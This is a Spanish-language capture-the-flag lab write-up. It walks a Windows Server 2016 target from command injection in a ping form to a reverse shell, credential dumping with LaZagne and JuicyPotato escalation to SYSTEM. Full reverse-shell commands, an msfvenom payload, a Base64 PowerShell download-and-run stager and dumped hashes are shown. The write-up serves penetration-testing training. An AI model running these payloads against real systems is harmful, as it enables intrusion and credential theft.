
# Escenario 1

Durante una prueba de penetración contra la organización `INLANEFREIGHT`, se encuentra con un host  Windows Server no perteneciente a un dominio que presenta una vulnerabilidad de Command Injection sin parchear. Tras establecerse, encuentra credenciales que podrían ser útiles para el movimiento lateral posterior en la evaluación y descubre otra vulnerabilidad que puede aprovecharse para escalar privilegios en el host objetivo.

Para esta evaluación, suponga que su cliente tiene un programa de gestión de parches/vulnerabilidades relativamente maduro pero no cuenta con suficiente personal y desconoce muchas de las mejores prácticas en torno a la gestión de configuración, lo que podría dejar a un host expuesto a una escalada de privilegios.

Enumere el host (comenzando con un escaneo de puertos con Nmap para identificar puertos/servicios accesibles), aproveche la falla de inyección de comandos para obtener acceso de reverse shell, escale privilegios a nivel `NT AUTHORITY\SYSTEM` o similar y responda las preguntas a continuación para completar esta parte de la evaluación.

```
Objetivo: 10.129.225.46
```

## <mark style="color:purple;">Pregunta 1</mark>

> ¿Qué dos KB están instalados en el sistema de destino? (Formato de respuesta: 3210000 y 3210060)

### Escaneo de puertos

```bash
sudo nmap -v -sV -sCV -T5 -Pn 10.129.225.46

Nmap scan report for 10.129.225.46
Host is up (0.050s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: DEV Connection Tester
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2025-03-31T18:13:33+00:00
|_ssl-date: 2025-03-31T18:13:37+00:00; +1m10s from scanner time.
| ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
| Issuer: commonName=WINLPE-SKILLS1-SRV
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-30T18:10:26
| Not valid after:  2025-09-29T18:10:26
| MD5:   3044:342f:397f:5c89:07e2:ca17:3f23:c675
|_SHA-1: 6caf:46ef:1f6c:6a3b:7849:f039:053e:4b55:2ce1:cb13
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos dos puertos abiertos en el objetivo:

<table><thead><tr><th width="125">Puerto</th><th width="141">Estado</th><th width="190">Servicio</th><th>Versión</th></tr></thead><tbody><tr><td><strong>80</strong></td><td>Abierto</td><td>HTTP (IIS)</td><td>Microsoft IIS 10.0</td></tr><tr><td><strong>3389</strong></td><td>Abierto</td><td>RDP</td><td>Microsoft Terminal Services</td></tr></tbody></table>

📌 **Importante**

* El puerto **80** aloja una aplicación web **"DEV Connection Tester"**. Posible vector de ataque.
* La información de **RDP** indica que el sistema es **Windows 10.0.14393**, lo que corresponde a **Windows Server 2016**.

### Command Inyection

La web tiene un input básico y un CTA de "Ping Host". Al probar el payload básico 127.0.0.1/whoami y capturarlo con BurpSuite observamos que el mensaje de error **"Ping request could not find host 127.0.0.1;whoami"** indica que el parámetro `addr` se está ejecutando dentro de un comando `ping`, pero el separador `;` no está funcionando para ejecutar comandos adicionales.

<figure><img src="/files/cGkWBQwiIaqanncXORcC" alt=""><figcaption></figcaption></figure>

Después de probar varios payloads encuentro uno que funciona: `127.0.0.1 | whoami`

<figure><img src="/files/5t5yeLDqLoUXruBxJlN2" alt=""><figcaption></figcaption></figure>

### Reverse Shell

Ahora que hemos identificado el Command Inyection vamos a conseguir una shell.

* Payload utilizado: `Windows, PowerShell#3 base64`

{% embed url="<https://www.revshells.com/>" %}

<figure><img src="/files/JmsokfYurq612FRLWnHo" alt=""><figcaption></figcaption></figure>

Sustituímos whoami por el payload en el input y le damos enter:

```
127.0.0.1 | <payload>
```

<figure><img src="/files/FzjxD7JbgQmdxEurBshZ" alt=""><figcaption></figcaption></figure>

```shell-session
afsh4ck@kali$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.179] from (UNKNOWN) [10.129.225.46] 49671
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```

### Hotfixes disponibles

Para responder a la pregunta 1, buscaremos los parches instalados en el sistema:

```powershell
PS C:\windows\system32\inetsrv> Get-Hotfix | Select-Object HotFixID | Sort-Object HotFixID
Get-Hotfix | Select-Object HotFixID | Sort-Object HotFixID

HotFixID 
-------- 
KB3199986
KB3200970
```

## <mark style="color:purple;">Pregunta 2</mark>

> Busque la contraseña de la cuenta `ldapadmin` en algún lugar del sistema.

{% hint style="warning" %}
En HTB esta pregunta debería ser la tercera, ya que necesitamos elevar privilegios para encontrarlo. Vamos a la pregunta 3 y después volvemos a esta.
{% endhint %}

### Enumeración de usuarios

Vemos que el usuario ldapadmin no está presente en el sistema:

```powershell
PS C:\Users\Administrator\Desktop> Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"

AccountType : 512
Caption     : WINLPE-SKILLS1-\Administrator
Domain      : WINLPE-SKILLS1-
SID         : S-1-5-21-2273790990-4155754617-1681432197-500
FullName    : 
Name        : Administrator

AccountType : 512
Caption     : WINLPE-SKILLS1-\DefaultAccount
Domain      : WINLPE-SKILLS1-
SID         : S-1-5-21-2273790990-4155754617-1681432197-503
FullName    : 
Name        : DefaultAccount

AccountType : 512
Caption     : WINLPE-SKILLS1-\Guest
Domain      : WINLPE-SKILLS1-
SID         : S-1-5-21-2273790990-4155754617-1681432197-501
FullName    : 
Name        : Guest

AccountType : 512
Caption     : WINLPE-SKILLS1-\htb-student
Domain      : WINLPE-SKILLS1-
SID         : S-1-5-21-2273790990-4155754617-1681432197-1001
FullName    : 
Name        : htb-student

AccountType : 512
Caption     : WINLPE-SKILLS1-\mrb3n
Domain      : WINLPE-SKILLS1-
SID         : S-1-5-21-2273790990-4155754617-1681432197-1000
FullName    : 
Name        : mrb3n
```

### LaZagne

Vamos a enviar el binario de [`LaZagne.exe`](https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe) en la máquina objetivo para extraer posibles credenciales almacenadas:

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.179/LaZagne.exe','C:\windows\Temp\LaZagne.exe')"
```

```powershell
PS C:\Users\Administrator\Desktop> C:\windows\Temp\LaZagne.exe all
C:\windows\Temp\LaZagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
[+] System masterkey decrypted for 644d306e-3a7a-434b-bd62-0b81ab91e5b6
[+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mrb3n:1000:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

------------------- Lsa_secrets passwords -----------------

DPAPI_SYSTEM
0000   01 00 00 00 1D 35 B6 2C 53 EC 28 92 E8 6D D5 BE    .....5.,S.(..m..
0010   C7 4C 78 54 10 66 34 3A 70 3F 77 AF 3F 11 FA 7F    .LxT.f4:p?w.?...
0020   03 8D 79 6A CC 1A FF AC 7C 0E DD D3                ..yj....|...

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   99 4F 5D 6C 55 B9 EC B5 0C 0B D8 75 A2 88 93 E4    .O]lU......u....
0020   C0 D9 EF C5 0D B9 40 57 92 39 9A BE 9D A5 83 ED    ......@W.9......
0030   11 CB 71 7C AB 32 CD 11 FD 7A ED 2E AB BE F1 62    ..q|.2...z.....b
0040   58 F2 1D 8A AC 9F AC FB 32 17 D8 EE B3 BD A5 DC    X.......2.......
0050   E2 D9 82 77 4A A3 16 D6 F3 B5 E0 28 13 72 C7 2E    ...wJ......(.r..


########## User: Administrator ##########

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
Host: dc01.inlanefreight.local
Port: 389
Login: ldapadmin
Password: car3ful_st0rinG_******
AuthenticationMethod: SIMPLE
```

Tenemos las creedenciales en plano de la cuenta `ldapadmin` y el hash del Administrador!

## <mark style="color:purple;">Pregunta 3</mark>

> Escale privilegios y envíe el contenido del archivo `flag.txt` en el Escritorio del administrador.

### Privilegios del usuario

```powershell
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Tenemos el privilegio **`SeImpersonatePrivilege`** habilitado, lo que significa que podemos explotar un **potato attack** (JuicyPotato, RoguePotato, PrintSpoofer....) para elevar privilegios a **NT AUTHORITY\SYSTEM**.

### Verificar versión de Windows

```powershell
PS C:\windows\system32\inetsrv> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
```

El sistema es **Windows Server 2016**, por lo que usaremos **JuicyPotato.**

#### Descargamos JuicyPotato en Kali

Descargar la última release:

{% embed url="<https://github.com/ohpe/juicy-potato/releases/tag/v0.1>" %}

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

#### Crear Shell.exe malicioso con Msfvenom (opcional)

Si subimos este `shell.exe` y lo ejecutamos a través de Juicy Potato nos devolverá un Meterpreter como SYSTEM, con el que podemos establecernos mucho mejor en el sistema.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.179 LPORT=443 -f exe -o shell.exe
```

### Transferencia de binarios a la máquina víctima

Debemos colocarlos en un directorio con permisos de ejecución como `C:\windows\Temp`

{% code title="JuicyPotatoNG" %}

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.179/JuicyPotato.exe','C:\windows\Temp\JuicyPotato.exe')"
```

{% endcode %}

{% code title="Binario de Netcat" %}

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.179/nc.exe','C:\windows\Temp\nc.exe')"
```

{% endcode %}

{% code title="shell..exe" %}

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.179/shell.exe','C:\windows\Temp\shell.exe')"
```

{% endcode %}

#### Binarios en el objetivo

```powershell
PS C:\windows\Temp> ls

    Directory: C:\windows\Temp


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                                                      
-a----         4/1/2025   5:03 AM         153600 JuicyPotato.exe             
-a----         4/1/2025   5:08 AM          38616 nc.exe                        
-a----         4/1/2025   5:03 AM           7168 shell.exe    
```

#### Iniciar un listener multi handler en Kali

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.179; set LPORT 443; exploit"

[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 10.10.14.179
LPORT => 443
[*] Started reverse TCP handler on 10.10.14.179:443 
```

#### Ejecutar JuicyPotato

Al ejecutarlo veremos que nos da un error ya que necesitamos proporcionarle un CLSID válido:

```powershell
PS C:\windows\system32\inetsrv> C:\windows\Temp\JuicyPotato.exe -l 1337 -p C:\windows\Temp\shell.exe -t *   

	JuicyPotatoNG
	by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 1337 
[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. 
```

Con la opción `-b` podemos hacer un bruteforce de CLSIDs para encontrar uno válido:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\windows\Temp\JuicyPotatoNG.exe -l 1337 -p C:\windows\Temp\shell.exe -t * -b
</strong>
	JuicyPotatoNG
	by decoder_it &#x26; splinter_code

[*] Bruteforcing 567 CLSIDs... 
</code></pre>

{% hint style="warning" %}
Esta técnica genera más de 1000 procesos, debemos usarla con precaución.
{% endhint %}

Podemos ejecutar el siguiente script para buscar CLSIDs potencialmente válidos, para no generar tanto ruido en la infraestructura (ni bloquear los puertos):

{% embed url="<https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1>" %}

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.179/GetCLSID.ps1','C:\windows\Temp\GetCLSID.ps1')"
```

Al ejecutar este script nos saca de la shell, por lo que nos moveremos a una shell más robusta con Meterpreter.

### Meterpreter Webdelivery <a href="#user-content-meterpreter-webdelivery" id="user-content-meterpreter-webdelivery"></a>

Configura un Powershell web delivery escuchando en el puerto 8080.

```bash
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 2; set payload windows/x64/meterpreter/reverse_http; set LHOST 10.10.14.179; set LPORT 4443; run"

msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://10.10.14.179:4443
[*] Using URL: http://10.10.14.179:8080/WYZepusQSpYoI
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABkAFEANAA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJABkAFEANAAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAGQAUQA0AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADkAOgA4ADAAOAAwAC8AVwBZAFoAZQBwAHUAcwBRAFMAcABZAG8ASQAvAHMAMQA2AFYAcgB6AEcAUgAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADkAOgA4ADAAOAAwAC8AVwBZAFoAZQBwAHUAcwBRAFMAcABZAG8ASQAnACkAKQA7AA==
```

#### Ejecutar el comando en la máquina objetivo

```powershell
PS C:\windows\system32\inetsrv> powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemW
```

#### Recibiendo el Meterpreter

```bash
*] 10.129.225.46    web_delivery - Delivering Payload (4148 bytes)
[!] http://10.10.14.179:4443 handling request from 10.129.225.46; (UUID: 4o8cbxwu) Without a database connected that payload UUID tracking will not work!
[*] http://10.10.14.179:4443 handling request from 10.129.225.46; (UUID: 4o8cbxwu) Staging x64 payload (204892 bytes) ...
[!] http://10.10.14.179:4443 handling request from 10.129.225.46; (UUID: 4o8cbxwu) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.179:4443 -> 10.129.225.46:49672) at 2025-04-01 00:08:03 +0200

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                   Connection
  --  ----  ----                     -----------                                   ----------
  1         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ WINLPE-SKILLS1-  10.10.14.179:4443 -> 10.129.225.46:49672 (10.129.225.46)
  
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool
```

### Conseguir CLSIDs válidos

Ahora si, ejecutamos `GetCLSID.ps1`:

```powershell
PS C:\windows\system32\inetsrv> cd C:\windows\Temp\; .\GetCLSID.ps1
cd C:\windows\Temp\; .\GetCLSID.ps1

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT         
Looking for CLSIDs
Looking for APIDs
Joining CLSIDs and APIDs

PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Users\Public\Windo
                    ws_Server_2016_Standard
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Users\Public
PSChildName       : Windows_Server_2016_Standard
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
PSIsContainer     : True
Name              : Windows_Server_2016_Standard
Parent            : Public
Exists            : True
Root              : C:\
FullName          : C:\Users\Public\Windows_Server_2016_Standard
Extension         : 
CreationTime      : 4/1/2025 1:17:55 AM
CreationTimeUtc   : 4/1/2025 8:17:55 AM
LastAccessTime    : 4/1/2025 1:17:55 AM
LastAccessTimeUtc : 4/1/2025 8:17:55 AM
LastWriteTime     : 4/1/2025 1:17:55 AM
LastWriteTimeUtc  : 4/1/2025 8:17:55 AM
Attributes        : Directory
Mode              : d-----
BaseName          : Windows_Server_2016_Standard
Target            : {}
LinkType          : 
```

#### Ver el listado de CLSIDs válidos

```powershell
PS C:\Users\Public> ls C:\Users\Public\Windows_Server_2016_Standard\

    Directory: C:\Users\Public\Windows_Server_2016_Standard


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----         4/1/2025   1:17 AM           2560 CLSID.list                    
-a----         4/1/2025   1:17 AM           6149 CLSIDs.csv   
```

Tenemos un listado y un csv. Vamos a echarles un vistazo:

```powershell
PS C:\Users\Public> type C:\Users\Public\Windows_Server_2016_Standard\CLSID.list

{D6015EC3-FA16-4813-9CA1-DA204574F5DA}
{c980e4c2-c178-4572-935d-a8a429884806}
{F01D6448-0959-4E38-B6F6-B6643D4558FE}
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}
{03ca98d6-ff5d-49b8-abc6-03dd84127020}
{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029}
<----SNIP---->
```

```powershell
PS C:\Users\Public> Get-Content C:\Users\Public\Windows_Server_2016_Standard\*.csv | Format-Table

"AppId","LocalService","CLSID"
"{4A0F9AA8-A71E-4CC3-891B-76CAC67E67C0}","ALG","{D6015EC3-FA16-4813-9CA1-DA204574F5DA}"
"{88283d7c-46f4-47d5-8fc2-db0b5cf0cb54}","AppReadiness","{c980e4c2-c178-4572-935d-a8a429884806}"
"{8D315960-32C4-4235-8369-901DF222816F}","AppVClient","{F01D6448-0959-4E38-B6F6-B6643D4558FE}"
"{0B15AFD8-3A99-4A6E-9975-30D66F70BD94}","AxInstSv","{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}"
"{69AD4AEE-51BE-439b-A92C-86AE490E8B30}","BITS","{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
"{5E176815-9A63-4A69-810F-62E90D36612A}","cdpsvc","{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029}"
"{52551A19-B337-498d-AE75-2283E29902DE}","CscService","{69486DD6-C19F-42e8-B508-A53F9F8E67B8}"
```

Con esta herramienta podemos extraer los CLSIDs válidos del listado:

{% embed url="<https://raw.githubusercontent.com/ohpe/juicy-potato/master/Test/test_clsid.bat>" %}

Lo modificamos así:

{% code title="test\_clsid.bat" %}

```powershell
@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (C:\Users\Public\Windows_Server_2016_Standard\CLSID.list) DO (
   echo %%i !port!
   C:\Users\Public\JuicyPotatoNG.exe -z -l !port! -c %%i >> result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)
```

{% endcode %}

Nos lo descargamos desde Kali:

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.179/test_clsid.bat','C:\windows\Temp\test_clsid.bat')"
```

Y lo ejecutamos para conseguir CLSIDs válidos:

```powershell
PS C:\windows\Temp> ./test_clsid.bat
./test_clsid.bat
{D6015EC3-FA16-4813-9CA1-DA204574F5DA} 10000
{c980e4c2-c178-4572-935d-a8a429884806} 10000
{F01D6448-0959-4E38-B6F6-B6643D4558FE} 10000
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} 10000
{03ca98d6-ff5d-49b8-abc6-03dd84127020} 10000
{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029} 10000
{69486DD6-C19F-42e8-B508-A53F9F8E67B8} 10000
{FD3659E9-A920-4123-AD64-7FC76C7AACDF} 10000
{d20a3293-3341-4ae8-9aaf-8e397cb63c34} 10000
{42CBFAA7-A4A7-47BB-B422-BD10E9D02700} 10000
{7022a3b3-d004-4f52-af11-e9e987fee25f} 10000 -
{0A886F29-465A-4aea-8B8E-BE926BFAE83E} 10000 -
{8B4B437E-4CAB-4e83-89F6-7F9F7DF414EA} 10000 -
{8C482DCE-2644-4419-AEFF-189219F916B9} 10000 -
{42C21DF5-FB58-4102-90E9-96A213DC7CE8} 10000 -
{C63261E4-6052-41FF-B919-496FECF4C4E5} 10000 -
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744} 10000 -
{1BE1F766-5536-11D1-B726-00C04FB926AF} 10000 -
{145B4335-FE2A-4927-A040-7C35AD3180EF} 10000 -
{D3DCB472-7261-43ce-924B-0704BD730D5F} 10000 -
{35b1d3bb-2d4e-4a7c-9af0-f2f677af7c30} 10000 -
{61738644-F196-11D0-9953-00C04FD919C1} 10000 -
{A9E69610-B80D-11D0-B9B9-00A0C922E750} 10000 -
{E0F55444-C140-4EF4-BDA3-621554EDB573} 10000 -
{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD} 10000 -
{22f5b1df-7d7a-4d21-97f8-c21aefba859c} 10000 -
{5BF9AA75-D7FF-4aee-AA2C-96810586456D} 10000 -
{5C03E1B1-EB13-4DF1-8943-2FE8E7D5F309} 10000 -
{000C101C-0000-0000-C000-000000000046} 10000 -
{6FE54E0E-009F-4E3D-A830-EDFA71E1F306} 10000 -
{A47979D2-C419-11D9-A5B4-001185AD2B89} 10000 -
{854A20FB-2D44-457D-992F-EF13785D2B51} 10000 -
{BA677074-762C-444b-94C8-8C83F93F6605} 10000 -
{581333F6-28DB-41BE-BC7A-FF201F12F3F6} 10000 -
{F0FF8EBB-F14D-4369-BD2E-D84FBF6122D6} 10000 -
{14E1D985-892F-4F52-A866-6B1AE6A53DFE} 10000 -
{555F3418-D99E-4E51-800A-6E89CFD8B1D7} 10000 -
{A1F4E726-8CF1-11D1-BF92-0060081ED811} 10000 -
{B6C292BC-7C88-41EE-8B54-8EC92617E599} 10000 -
{65EE1DBA-8FF4-4a58-AC1C-3470EE2F376A} 10000 -
{F9A874B6-F8A8-4D73-B5A8-AB610816828B} 10000 -
{50D185B9-FFF3-4656-92C7-E4018DA4361D} 10000 -
{4661626C-9F41-40A9-B3F5-5580E80CB347} 10000 -
{3c6859ce-230b-48a4-be6c-932c0c202048} 10000 -
{F556F9B2-C810-44A2-BA7A-3AB8C24E666D} 10000 -
{0fb40f0d-1021-4022-8da0-aab0588dfc8b} 10000 -
{B91D5831-B1BD-4608-8198-D72E155020F7} 10000 -
{7D1933CB-86F6-4A98-8628-01BE94C9A575} 10000 -
{397a2e5f-348c-482d-b9a3-57d383b483cd} 10000 -
{0B5A2C52-3EB9-470a-96E2-6C6D4570E40F} 10000 -
{02ECA72E-27DA-40E1-BDB1-4423CE649AD9} 10000 -
{84C22490-C68A-4492-B3A6-3B7CB17FA122} 10000 -
{9A3E1311-23F8-42DC-815F-DDBC763D50BB} 10000 -
{97061DF1-33AA-4B30-9A92-647546D943F3} 10000 -
{119817C9-666D-4053-AEDA-627D0E25CCEF} 10000 -
{0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB} 10000 -
{2781761E-28E2-4109-99FE-B9D127C57AFE} 10000 -
{8BC3F05E-D86B-11D0-A075-00C04FB68820} 10000 -
{3185a766-b338-11e4-a71e-12e3f512a338} 10000 -
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} 10000 # Probamos con este y funciona!
{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7} 10000 -
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 10000 -
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 10000 -
{5B3E6773-3A99-4A3D-8096-7765DD11785C} 10000 -
```

Ya es cuestión de ir probando uno por uno de la siguiente manera:

```powershell
PS C:\windows\Temp> C:\windows\Temp\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\windows\Temp\nc.exe 10.10.14.179 8443 -e cmd.exe" -t * -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
Testing {7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} 53375
......
[+] authresult 0
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

#### Recibimos una Shell SYSTEM

```shell-session
afsh4ck@kali$ nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.14.179] from (UNKNOWN) [10.129.225.46] 49799
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Acceso a la flag

```powershell
c:\Users\Administrator\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is 7029-F417

 Directory of c:\Users\Administrator\Desktop

08/08/2021  06:54 PM    <DIR>          .
08/08/2021  06:54 PM    <DIR>          ..
08/09/2021  06:08 PM                26 flag.txt
               1 File(s)             26 bytes
               2 Dir(s)  18,932,436,992 bytes free

c:\Users\Administrator\Desktop> type flag.txt
Ev3ry_sysadm1ns_***********!
```

En este punto, vamos a la [pregunta 2](#pregunta-2) para enumerar más información.

## <mark style="color:purple;">Pregunta 4</mark>

> Tras aumentar los privilegios, localice el archivo "`confidential.txt`". Envíe su contenido.

```powershell
PS C:\Windows\system32> Get-ChildItem -Path C:\ -Filter "confidential.txt" -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Music


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----         6/7/2021  12:41 PM             32 confidential.txt  
```

```powershell
PS C:\Windows\system32> type C:\Users\Administrator\Music\confidential.txt

5e5a7dafa79d923de3340e1463******
```
